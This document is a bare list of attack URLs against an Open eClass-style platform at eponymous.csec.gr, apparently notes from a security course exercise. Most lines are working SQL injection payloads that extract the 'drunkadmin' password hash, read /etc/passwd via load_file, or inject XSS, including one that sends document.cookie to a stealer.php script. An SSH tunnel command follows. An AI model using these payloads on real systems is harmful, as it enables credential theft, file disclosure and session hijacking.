TOP

http://eponymous.csec.gr/modules/admin/addusertocours.php?c=2%27%20AND%201=2%20UNION%20SELECT%20%272%20AND%202=3%20UNION%20SELECT%201,password,3%20FROM%20eclass.user%20where%20username=%22drunkadmin%22%20UNION%20SELECT%201,2,3%20FROM%20cours_user%20cu,user%20u%20WHERE%201=2%27--%20--

http://eponymous.csec.gr/modules/work/work.php?choice=bla&id=%27%20AND%202=3%20UNION%20SELECT%20password%20from%20eclass.user%20where%20username=%22drunkadmin%22%20--%20--

MANOS 

http://eponymous.csec.gr/modules/phpbb/viewtopic.php?topic=2)%20UNION%20SELECT%20%22a%22,password%20FROM%20eclass.user%20WHERE%20username=%22drunkadmin%22%20--%20--

http://eponymous.csec.gr/modules/phpbb/viewtopic.php?topic=1)%20UNION%20SELECT%20%22a%22,%22%3Cscript%3Ealert(%27hello%20lef%27)%3C/script%3E%22%20FROM%20forums%20f,%20topics%20t%20WHERE%201=1%20OR%20(1=2%20&forum=1

http://eponymous.csec.gr/modules/phpbb/viewtopic.php?topic=3&forum=1%27)%20AND%202=1%20UNION%20SELECT%20%22a%22,%22%3Cscript%3Ealert(%27test%27)%3C/script%3E%22--%20.

http://eponymous.csec.gr/modules/phpbb/reply.php?topic=1%27%20AND%201=2)%20UNION%20SELECT%20%22a%22,%22b%22,%22c%22,%22%20%3Cscript%3Ealert(%27XSS%27)%3C/script%3E%22--%20.&forum=1

http://eponymous.csec.gr/modules/phpbb/viewtopic.php?topic=3%20AND%201=2)%20UNION%20SELECT%20%22a%22,%20password,%20from%20user%20where%20username=%22drunkadmin%22--%20--&forum=1

http://eponymous.csec.gr/modules/course_info/infocours.php?from_home=TRUE&cid=TMA101%27%20AND%201=2%20UNION%20SELECT%20%221%22,%222%22,%223%22,password,%225%22,%226%22,%227%22,%228%22,%229%22,%2210%22%20FROM%20user%20where%20username=%22drunkadmin%22--%20--


http://eponymous.csec.gr/modules/phpbb/viewtopic.php?topic=3%20AND%201=2)%20UNION%20SELECT%20%22a%22,%20load_file(%22/etc/passwd%22)--%20--&forum=1


http://eponymous.csec.gr/modules/admin/search_user.php
' AND 1=2 UNION SELECT "2",password,"3","4","5","6" FROM eclass.user where username="drunkadmin" -- --


http://eponymous.csec.gr/modules/admin/monthlyReport.php
' AND 2=3 UNION SELECT password,1,2,3,4,5 from eclass.user where username='drunkadmin' -- --


http://eponymous.csec.gr/modules/course_info/archive_course.php?c=%27%20AND%202=3%20UNION%20SELECT%201,2,3,password,5,6,7,8,9,10%20from%20eclass.user%20where%20username=%22drunkadmin%22--%20--


http://eponymous.csec.gr/modules/course_info/archive_course.php?c=%27%20AND%202=3%20UNION%20SELECT%201,2,3,password,5,6,7,8,9,10%20from%20eclass.user%20where%20username=%22drunkadmin%22--%20--


LEF


http://eponymous.csec.gr/modules/phpbb/viewtopic.php?topic=3)%20AND%20(t.forum_id%20=%20f.forum_id)%20OR%201=1%20--%20&forum=1

http://eponymous.csec.gr/modules/phpbb/viewtopic.php?topic=3%20AND%201=2)%20UNION%20SELECT%20%22%3Cscipt%3Edocument.images[0].location=%27Eponymous.csec.gr/stealer.php?cookie=%27document.cookie;%3C/script%3E%22,%20GROUP_CONCAT(username%20SEPARATOR%20%27,%20%27)%20from%20users%20group%20by%20%27all%27--%20--&forum=1


http://eponymous.csec.gr/modules/work/work.php?id=2%27%20AND%202=3%20UNION%20SELECT%201,password,3,4,5,6,7,8,9,10%20from%20eclass.user%20where%20username=%22drunkadmin%22%20--%20--

http://eponymous.csec.gr/modules/work/work.php?id=2%27%20AND%202=3%20UNION%20SELECT%201,password,3,4,5,6,7,8,9,10%20from%20eclass.user%20where%20username=%22drunkadmin%22%20--%20--

ssh -v -N -L 3307:localhost:11255 Eponymous@Eponymous.csec.gr
./squirrel-sql.sh &